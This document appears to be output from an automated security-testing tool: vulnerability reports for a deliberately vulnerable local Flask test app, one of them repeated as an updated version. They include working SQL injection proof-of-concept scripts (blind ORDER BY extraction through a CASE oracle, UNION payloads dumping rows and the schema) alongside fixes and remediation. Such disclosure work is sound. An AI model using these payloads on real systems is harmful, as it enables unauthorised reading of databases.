╭─ VULN-0002 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: SQL Injection in GET /orders sort parameter (ORDER BY clause)        │
│                                                                              │
│  Severity: MEDIUM                                                            │
│                                                                              │
│  CVSS Score: 6.2                                                             │
│                                                                              │
│  Target: /workspace/test-vuln-hard (Flask app, app.py)                       │
│                                                                              │
│  Endpoint: /orders                                                           │
│                                                                              │
│  Method: GET                                                                 │
│                                                                              │
│  CVSS Vector: AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                            │
│                                                                              │
│  Description                                                                 │
│  The `sort` query parameter of `GET /orders` is interpolated directly into   │
│  an `ORDER BY` clause with an f-string, allowing unauthenticated SQL         │
│  injection. A quote-free `CASE` expression payload turns the response row    │
│  ordering into a boolean oracle, which was used to extract the `note`        │
│  column (`flag{orderby_ok}`, all notes, and the SQLite version) character    │
│  by character.                                                               │
│                                                                              │
│  Impact                                                                      │
│  Any client that can reach the service reads arbitrary data from the         │
│  database without authentication, including values (the `note` column,       │
│  full-table aggregates, DBMS metadata) that the endpoint never               │
│  intentionally returns. Demonstrated: blind extraction of `orders.note` for  │
│  row 1 (`flag{orderby_ok}`), the concatenation of all `note` values, and     │
│  `sqlite_version()` (`3.53.4`). Because the injection controls the SQL       │
│  text, the same primitive can be pivoted to read `sqlite_master` and any     │
│  other table in the database file.                                           │
│                                                                              │
│  Technical Analysis                                                          │
│  `app.py` lines 25-27:                                                       │
│                                                                              │
│  ```python title=app.py startLineNumber=25 endLineNumber=27                  │
│      sort = request.args.get("sort", "id")                                   │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
│  {sort}").fetchall()                                                         │
│  ```                                                                         │
│                                                                              │
│  `sort` is taken straight from `request.args` and pasted into the statement  │
│  with an f-string. There is no binding, no type check, and no allowlist, so  │
│  the parameter is parsed as SQL syntax rather than as data.                  │
│                                                                              │
│  **Why the trivial `?id=1` case is insufficient.** The value sits in an      │
│  `ORDER BY`, not in a `WHERE` comparison, so a tautology-style value         │
│  injection (`?id=1' OR '1'='1`) has nothing to break out of. Exploitation    │
│  requires supplying a sortable *expression*.                                 │
│                                                                              │
│  **Oracle construction.** Sorting by a constant leaves the row order         │
│  unchanged, which makes naive sub-select payloads look inert. The reliable   │
│  construction uses an expression that is correlated with the outer row, so   │
│  the key is re-evaluated per row and the ordering genuinely flips:           │
│                                                                              │
│  ```                                                                         │
│  sort=(CASE WHEN (<predicate>) THEN -id ELSE id END)                         │
│  ```                                                                         │
│                                                                              │
│  `-id` sorts the returned rows as `3,2,1`; `id` sorts them as `1,2,3`.       │
│  "Response order is `3,2,1`" therefore means "predicate is TRUE". The        │
│  predicate can contain an arbitrary sub-select, which gives arbitrary data   │
│  extraction with no quotes in the payload at all — invisible to quote-based  │
│  scanners and value-injection tooling.                                       │
│                                                                              │
│  **Confirmed sink, not a scanner-only claim.** `ast-grep` located both       │
│  f-string `conn.execute` sinks at `app.py:27` and `app.py:36`, and           │
│  `opengrep` (rules `python.flask.security.injection.tainted-sql-string`,     │
│  `python.lang.security.audit.formatted-sql-query`,                           │
│  `python.sqlalchemy.security.sqlalchemy-execute-raw-query`) reported the     │
│  same lines. Dynamic testing then proved real disclosure.                    │
│                                                                              │
│  Note that `"?id=1"`-style tooling also cannot detect this: the payload      │
│  needs no quotes and produces valid SQL at every step.                       │
│                                                                              │
│  PoC Description                                                             │
│  1. Start the application so it listens on the loopback interface at port    │
│  8098.                                                                       │
│  2. Confirm the baseline ordering with `sort=id`, which returns rows         │
│  `[[1,...],[2,...],[3,...]]`.                                                │
│  3. Confirm the boolean oracle with a correlated `CASE` expression whose     │
│  predicate is trivially true: the response order flips to                    │
│  `[[3,...],[2,...],[1,...]]`. Repeat with a false predicate, which leaves    │
│  the order unchanged.                                                        │
│  4. Replace the trivial predicate with one that tests a character of the     │
│  secret, and binary-search the character code to reconstruct the value of    │
│  `note` for row 1.                                                           │
│  5. Repeat the character-wise extraction for other expressions (all notes,   │
│  the DBMS version) to show that arbitrary expressions are evaluated.         │
│                                                                              │
│  PoC Code                                                                    │
│  ```python                                                                   │
│  """ORDER BY SQL injection -> blind character extraction from GET            │
│  /orders?sort=                                                               │
│                                                                              │
│  Payload shape (quote-free):                                                 │
│    sort=(CASE WHEN (<predicate on secret>) THEN -id ELSE id END)             │
│                                                                              │
│  Oracle: response row order. `-id` sorts ids 3,2,1; `id` sorts 1,2,3.        │
│  "response is [[3,...],[2,...],[1,...]]" == predicate TRUE.                  │
│  """                                                                         │
│  import json, urllib.parse, urllib.request                                   │
│                                                                              │
│  BASE = "http://127.0.0.1:8098"                                              │
│                                                                              │
│  def oracle(predicate):                                                      │
│      sort = f"(CASE WHEN ({predicate}) THEN -id ELSE id END)"                │
│      url = f"{BASE}/orders?sort=" + urllib.parse.quote(sort)                 │
│      rows = json.loads(urllib.request.urlopen(url).read().decode())          │
│      return [r[0] for r in rows] == [3, 2, 1]                                │
│                                                                              │
│  def extract(secret_expr, maxlen=40):                                        │
│      out = ""                                                                │
│      for i in range(1, maxlen + 1):                                          │
│          lo, hi = 32, 126                                                    │
│          if not oracle(f"unicode(substr({secret_expr},{i},1)) >= {lo}"):     │
│              return out                                                      │
│          while lo < hi:                                                      │
│              mid = (lo + hi + 1) // 2                                        │
│              if oracle(f"unicode(substr({secret_expr},{i},1)) >= {mid}"):    │
│                  lo = mid                                                    │
│              else:                                                           │
│                  hi = mid - 1                                                │
│          out += chr(lo)                                                      │
│      return out                                                              │
│                                                                              │
│  print("[control] 1=1 ->", oracle("1=1"), "| 1=2 ->", oracle("1=2"))         │
│  print("[EXFIL] orders.note (id=1) =", repr(extract("(SELECT note FROM       │
│  orders WHERE id=1)")))                                                      │
│  print("[EXFIL] group_concat(note) =", repr(extract("(SELECT                 │
│  group_concat(note,'|') FROM orders)")))                                     │
│  print("[EXFIL] sqlite_version()   =", repr(extract("(SELECT                 │
│  sqlite_version())")))                                                       │
│  ```                                                                         │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: app.py:25-27                                                  │
│    Vulnerable sink: unvalidated `sort` interpolated into ORDER BY            │
│        sort = request.args.get("sort", "id")                                 │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
│  {sort}").fetchall()                                                         │
│    Fix:                                                                      │
│    -     sort = request.args.get("sort", "id")                               │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
│  {sort}").fetchall()                                                         │
│    +     sort = request.args.get("sort", "id")                               │
│      columns = {"id": "id", "sku": "sku", "qty": "qty"}                      │
│      column = columns.get(sort)                                              │
│      if column is None:                                                      │
│          return jsonify({"error": "invalid sort column"}), 400               │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
│  {column}").fetchall()                                                       │
│                                                                              │
│    Location 2: app.py:22                                                     │
│    Module-level allowlist for sortable columns                               │
│    @app.route("/orders")                                                     │
│    Fix:                                                                      │
│    - @app.route("/orders")                                                   │
│    + SORTABLE_COLUMNS = {"id": "id", "sku": "sku", "qty": "qty"}             │
│                                                                              │
│                                                                              │
│  @app.route("/orders")                                                       │
│                                                                              │
│  Remediation                                                                 │
│  1. Never interpolate client input into SQL text. The `ORDER BY` clause      │
│  cannot be parameterized as a value, so validate the sort key against a      │
│  server-side allowlist of sortable column names and map the client value     │
│  onto a fixed identifier.                                                    │
│  2. Reject any `sort` value that is not in the allowlist (return a 400)      │
│  rather than silently defaulting, so misuse is visible.                      │
│  3. If descending or multi-column ordering is required, express it as        │
│  explicit allowlisted options (for example `sort=id` and `order=asc|desc`)   │
│  and build the clause only from those validated constants.                   │
│  4. Add a regression test asserting that expression, quote, and comment      │
│  payloads in `sort` cannot change the returned ordering.                     │
│  5. Treat the same pattern anywhere a column, table, or direction name       │
│  comes from a request.                                                       │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

╭─ VULN-0003 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: SQL Injection in POST /orders/by-sku sku JSON field (WHERE clause)   │
│                                                                              │
│  Severity: MEDIUM                                                            │
│                                                                              │
│  CVSS Score: 6.2                                                             │
│                                                                              │
│  Target: /workspace/test-vuln-hard (Flask app, app.py)                       │
│                                                                              │
│  Endpoint: /orders/by-sku                                                    │
│                                                                              │
│  Method: POST                                                                │
│                                                                              │
│  CVSS Vector: AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                            │
│                                                                              │
│  Description                                                                 │
│  The JSON `sku` field of `POST /orders/by-sku` is interpolated inside        │
│  single quotes in a `WHERE sku = '{sku}'` clause. A single quote in the      │
│  JSON body breaks out of the literal, allowing `UNION`-based injection. An   │
│  unauthenticated client used it to return every row in the table (including  │
│  rows belonging to other SKUs that the intended query can never match) and   │
│  to dump the database schema from `sqlite_master`.                           │
│                                                                              │
│  Impact                                                                      │
│  An unauthenticated client reads the entire `orders` table and the database  │
│  schema without knowing any SKU. Demonstrated: returns `beta` and `gamma`    │
│  rows for a request nominally scoped to a single SKU, and returns the        │
│  `CREATE TABLE` statement from `sqlite_master`. Because the injected query   │
│  text is fully attacker-controlled, the same primitive extends to any other  │
│  table in the database file.                                                 │
│                                                                              │
│  Technical Analysis                                                          │
│  `app.py` lines 33-36:                                                       │
│                                                                              │
│  ```python title=app.py startLineNumber=33 endLineNumber=36                  │
│      body = request.get_json(force=True, silent=True) or {}                  │
│      sku = body.get("sku", "alpha")                                          │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, note FROM orders WHERE sku =      │
│  '{sku}'").fetchall()                                                        │
│  ```                                                                         │
│                                                                              │
│  `sku` comes from an attacker-supplied JSON body and is concatenated inside  │
│  a pair of literal single quotes. `get_json(force=True, silent=True)` only   │
│  makes body parsing lenient — it performs no sanitization — so any content   │
│  the JSON decoder accepts reaches the SQL string verbatim.                   │
│                                                                              │
│  **Exploitation shape.** A single `'` in the JSON value closes the string    │
│  literal, after which the attacker appends arbitrary SQL. The projected      │
│  column list is `(id, sku, note)`, so a three-column `UNION SELECT` maps     │
│  attacker-chosen expressions directly onto the response. A trailing `--`     │
│  comments out the closing quote.                                             │
│                                                                              │
│  Two independent channels were confirmed: a boolean channel (`alpha' AND     │
│  '1'='2` yields an empty set while `alpha' AND '1'='1` yields the row) and   │
│  a `UNION` channel that returns rows for *other* SKUs and reads              │
│  `sqlite_master`.                                                            │
│                                                                              │
│  **Why this is real disclosure and not just a syntax difference.** The       │
│  handler's intended query for a single `sku` can only ever return rows       │
│  whose `sku` equals that value. The `UNION` payload returned `beta` and      │
│  `gamma` alongside `alpha` for a request that named no valid breakout, and   │
│  returned the `CREATE TABLE` statement — content the parameterized query is  │
│  structurally incapable of producing.                                        │
│                                                                              │
│  **Static corroboration.** `ast-grep` identified the f-string                │
│  `conn.execute` sink at `app.py:36`, and `opengrep` flagged the same line    │
│  with `python.flask.security.injection.tainted-sql-string`,                  │
│  `python.lang.security.audit.formatted-sql-query`, and                       │
│  `python.sqlalchemy.security.sqlalchemy-execute-raw-query`. `gitleaks` and   │
│  `trivy fs` reported no secrets or vulnerable dependencies, confirming the   │
│  issue is the injection itself rather than credential leakage.               │
│                                                                              │
│  PoC Description                                                             │
│  1. Start the application so it listens on the loopback interface at port    │
│  8098.                                                                       │
│  2. Send a baseline request with `{"sku": "alpha"}` and observe that         │
│  exactly one row is returned.                                                │
│  3. Send `{"sku": "alpha' AND '1'='2"}` and observe an empty array,          │
│  confirming the value is evaluated as SQL rather than compared as a string.  │
│  4. Send `{"sku": "' UNION SELECT id,sku,note FROM orders--"}` and observe   │
│  that every row in the table is returned, including SKUs other than the      │
│  requested one.                                                              │
│  5. Send `{"sku": "' UNION SELECT 1,name,sql FROM sqlite_master--"}` and     │
│  observe the table definition, confirming arbitrary column and table         │
│  access.                                                                     │
│                                                                              │
│  PoC Code                                                                    │
│  ```python                                                                   │
│  """UNION-based SQL injection in the JSON `sku` field of POST                │
│  /orders/by-sku."""                                                          │
│  import json, urllib.request                                                 │
│                                                                              │
│  BASE = "http://127.0.0.1:8098"                                              │
│                                                                              │
│  def post(sku):                                                              │
│      req = urllib.request.Request(                                           │
│          f"{BASE}/orders/by-sku",                                            │
│          data=json.dumps({"sku": sku}).encode(),                             │
│          headers={"Content-Type": "application/json"},                       │
│          method="POST",                                                      │
│      )                                                                       │
│      return urllib.request.urlopen(req).read().decode()                      │
│                                                                              │
│  print("[baseline alpha]    ->", post("alpha"))                              │
│  print("[baseline beta]     ->", post("beta"))                               │
│  print("[boolean false]     ->", post("alpha' AND '1'='2"))                  │
│  print("[UNION all rows]    ->", post("' UNION SELECT id,sku,note FROM       │
│  orders--"))                                                                 │
│  print("[UNION schema dump] ->", post("' UNION SELECT 1,name,sql FROM        │
│  sqlite_master--"))                                                          │
│  ```                                                                         │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: app.py:36                                                     │
│    Vulnerable sink: `sku` string-interpolated into a quoted WHERE predicate  │
│        rows = conn.execute(f"SELECT id, sku, note FROM orders WHERE sku =    │
│  '{sku}'").fetchall()                                                        │
│    Fix:                                                                      │
│    -     rows = conn.execute(f"SELECT id, sku, note FROM orders WHERE sku =  │
│  '{sku}'").fetchall()                                                        │
│    +     rows = conn.execute("SELECT id, sku, note FROM orders WHERE sku =   │
│  ?", (sku,)).fetchall()                                                      │
│                                                                              │
│  Remediation                                                                 │
│  1. Replace the string-interpolated statement with a bound parameter,        │
│  passing `sku` as the second argument to `execute()` so the driver sends it  │
│  as data, never as SQL syntax.                                               │
│  2. Never place request values inside SQL string literals with f-strings or  │
│  concatenation anywhere in the codebase; audit for the same pattern in       │
│  other handlers.                                                             │
│  3. Connect to SQLite with a least-privilege role and consider an            │
│  authorizer callback that denies access to `sqlite_master` and               │
│  non-application tables, limiting the blast radius of any future injection.  │
│  4. Validate that `sku` matches the expected format (for example a short     │
│  alphanumeric allowlist pattern) and reject anything else with a 400, as     │
│  defense in depth.                                                           │
│  5. Add a regression test asserting that quote, comment, and `UNION`         │
│  payloads in `sku` return an empty result set rather than injected rows.     │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

╭─ VULN-0002 (updated) ────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: SQL Injection in GET /orders sort parameter (ORDER BY clause)        │
│                                                                              │
│  Severity: MEDIUM                                                            │
│                                                                              │
│  CVSS Score: 6.2                                                             │
│                                                                              │
│  Target: /workspace/test-vuln-hard (Flask app, app.py)                       │
│                                                                              │
│  Endpoint: /orders                                                           │
│                                                                              │
│  Method: GET                                                                 │
│                                                                              │
│  CVSS Vector: AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                            │
│                                                                              │
│  Description                                                                 │
│  The `sort` query parameter of `GET /orders` is interpolated directly into   │
│  an `ORDER BY` clause with an f-string, allowing unauthenticated SQL         │
│  injection. A quote-free `CASE` expression payload turns the response row    │
│  ordering into a boolean oracle, which was used to extract the `note`        │
│  column (`flag{orderby_ok}`, all notes, and the SQLite version) character    │
│  by character.                                                               │
│                                                                              │
│  Impact                                                                      │
│  Any client that can reach the service reads arbitrary data from the         │
│  database without authentication, including values (the `note` column,       │
│  full-table aggregates, DBMS metadata) that the endpoint never               │
│  intentionally returns. Demonstrated: blind extraction of `orders.note` for  │
│  row 1 (`flag{orderby_ok}`), the concatenation of all `note` values, and     │
│  `sqlite_version()` (`3.53.4`). Because the injection controls the SQL       │
│  text, the same primitive can be pivoted to read `sqlite_master` and any     │
│  other table in the database file.                                           │
│                                                                              │
│  Technical Analysis                                                          │
│  `app.py` lines 25-27:                                                       │
│                                                                              │
│  ```python title=app.py startLineNumber=25 endLineNumber=27                  │
│      sort = request.args.get("sort", "id")                                   │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
│  {sort}").fetchall()                                                         │
│  ```                                                                         │
│                                                                              │
│  `sort` is taken straight from `request.args` and pasted into the statement  │
│  with an f-string. There is no binding, no type check, and no allowlist, so  │
│  the parameter is parsed as SQL syntax rather than as data.                  │
│                                                                              │
│  **Why the trivial `?id=1` case is insufficient.** The value sits in an      │
│  `ORDER BY`, not in a `WHERE` comparison, so a tautology-style value         │
│  injection (`?id=1' OR '1'='1`) has nothing to break out of. Exploitation    │
│  requires supplying a sortable *expression*.                                 │
│                                                                              │
│  **Oracle construction.** Sorting by a constant leaves the row order         │
│  unchanged, which makes naive sub-select payloads look inert. The reliable   │
│  construction uses an expression that is correlated with the outer row, so   │
│  the key is re-evaluated per row and the ordering genuinely flips:           │
│                                                                              │
│  ```                                                                         │
│  sort=(CASE WHEN (<predicate>) THEN -id ELSE id END)                         │
│  ```                                                                         │
│                                                                              │
│  `-id` sorts the returned rows as `3,2,1`; `id` sorts them as `1,2,3`.       │
│  "Response order is `3,2,1`" therefore means "predicate is TRUE". The        │
│  predicate can contain an arbitrary sub-select, which gives arbitrary data   │
│  extraction with no quotes in the payload at all — invisible to quote-based  │
│  scanners and value-injection tooling.                                       │
│                                                                              │
│  **Confirmed sink, not a scanner-only claim.** `ast-grep` located both       │
│  f-string `conn.execute` sinks at `app.py:27` and `app.py:36`, and           │
│  `opengrep` (rules `python.flask.security.injection.tainted-sql-string`,     │
│  `python.lang.security.audit.formatted-sql-query`,                           │
│  `python.sqlalchemy.security.sqlalchemy-execute-raw-query`) reported the     │
│  same lines. Dynamic testing then proved real disclosure.                    │
│                                                                              │
│  Note that `"?id=1"`-style tooling also cannot detect this: the payload      │
│  needs no quotes and produces valid SQL at every step.                       │
│                                                                              │
│  PoC Description                                                             │
│  1. Start the application so it listens on the loopback interface at port    │
│  8098.                                                                       │
│  2. Confirm the baseline ordering with `sort=id`, which returns rows         │
│  `[[1,...],[2,...],[3,...]]`.                                                │
│  3. Confirm the boolean oracle with a correlated `CASE` expression whose     │
│  predicate is trivially true: the response order flips to                    │
│  `[[3,...],[2,...],[1,...]]`. Repeat with a false predicate, which leaves    │
│  the order unchanged.                                                        │
│  4. Replace the trivial predicate with one that tests a character of the     │
│  secret, and binary-search the character code to reconstruct the value of    │
│  `note` for row 1.                                                           │
│  5. Repeat the character-wise extraction for other expressions (all notes,   │
│  the DBMS version) to show that arbitrary expressions are evaluated.         │
│                                                                              │
│  PoC Code                                                                    │
│  ```python                                                                   │
│  """ORDER BY SQL injection -> blind character extraction from GET            │
│  /orders?sort=                                                               │
│                                                                              │
│  Payload shape (quote-free):                                                 │
│    sort=(CASE WHEN (<predicate on secret>) THEN -id ELSE id END)             │
│                                                                              │
│  Oracle: response row order. `-id` sorts ids 3,2,1; `id` sorts 1,2,3.        │
│  "response is [[3,...],[2,...],[1,...]]" == predicate TRUE.                  │
│  """                                                                         │
│  import json, urllib.parse, urllib.request                                   │
│                                                                              │
│  BASE = "http://127.0.0.1:8098"                                              │
│                                                                              │
│  def oracle(predicate):                                                      │
│      sort = f"(CASE WHEN ({predicate}) THEN -id ELSE id END)"                │
│      url = f"{BASE}/orders?sort=" + urllib.parse.quote(sort)                 │
│      rows = json.loads(urllib.request.urlopen(url).read().decode())          │
│      return [r[0] for r in rows] == [3, 2, 1]                                │
│                                                                              │
│  def extract(secret_expr, maxlen=40):                                        │
│      out = ""                                                                │
│      for i in range(1, maxlen + 1):                                          │
│          lo, hi = 32, 126                                                    │
│          if not oracle(f"unicode(substr({secret_expr},{i},1)) >= {lo}"):     │
│              return out                                                      │
│          while lo < hi:                                                      │
│              mid = (lo + hi + 1) // 2                                        │
│              if oracle(f"unicode(substr({secret_expr},{i},1)) >= {mid}"):    │
│                  lo = mid                                                    │
│              else:                                                           │
│                  hi = mid - 1                                                │
│          out += chr(lo)                                                      │
│      return out                                                              │
│                                                                              │
│  print("[control] 1=1 ->", oracle("1=1"), "| 1=2 ->", oracle("1=2"))         │
│  print("[EXFIL] orders.note (id=1) =", repr(extract("(SELECT note FROM       │
│  orders WHERE id=1)")))                                                      │
│  print("[EXFIL] group_concat(note) =", repr(extract("(SELECT                 │
│  group_concat(note,'|') FROM orders)")))                                     │
│  print("[EXFIL] sqlite_version()   =", repr(extract("(SELECT                 │
│  sqlite_version())")))                                                       │
│  ```                                                                         │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: app.py:25-27                                                  │
│    Vulnerable sink and fix: resolve `sort` through an allowlist before       │
│  building the ORDER BY clause                                                │
│        sort = request.args.get("sort", "id")                                 │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
│  {sort}").fetchall()                                                         │
│    Fix:                                                                      │
│    -     sort = request.args.get("sort", "id")                               │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
│  {sort}").fetchall()                                                         │
│    +     sort = request.args.get("sort", "id")                               │
│      columns = {"id": "id", "sku": "sku", "qty": "qty"}                      │
│      column = columns.get(sort)                                              │
│      if column is None:                                                      │
│          return jsonify({"error": "invalid sort column"}), 400               │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
│  {column}").fetchall()                                                       │
│                                                                              │
│  Remediation                                                                 │
│  1. Never interpolate client input into SQL text. The `ORDER BY` clause      │
│  cannot be parameterized as a value, so validate the sort key against a      │
│  server-side allowlist of sortable column names and map the client value     │
│  onto a fixed identifier.                                                    │
│  2. Reject any `sort` value that is not in the allowlist (return a 400)      │
│  rather than silently defaulting, so misuse is visible.                      │
│  3. If descending or multi-column ordering is required, express it as        │
│  explicit allowlisted options (for example `sort=id` and `order=asc|desc`)   │
│  and build the clause only from those validated constants.                   │
│  4. Add a regression test asserting that expression, quote, and comment      │
│  payloads in `sort` cannot change the returned ordering.                     │
│  5. Treat the same pattern anywhere a column, table, or direction name       │
│  comes from a request.                                                       │
│                                                                              │
